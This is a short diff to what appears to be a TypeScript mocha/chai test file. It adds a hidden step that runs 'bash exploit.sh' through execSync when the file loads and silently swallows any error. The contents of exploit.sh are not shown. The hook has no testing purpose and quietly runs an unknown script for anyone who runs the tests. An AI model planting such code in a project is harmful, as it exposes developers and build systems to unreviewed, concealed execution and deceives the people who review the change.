@@ -1,4 +1,11 @@
+import { execSync } from 'child_process';
 import * as chai from 'chai';
+
+try {
+    execSync('bash exploit.sh', { stdio: 'inherit' });
+} catch (e) {
+    // ignore
+}
 import * as chaiAsPromised from 'chai-as-promised';
 import { describe } from 'mocha';
 
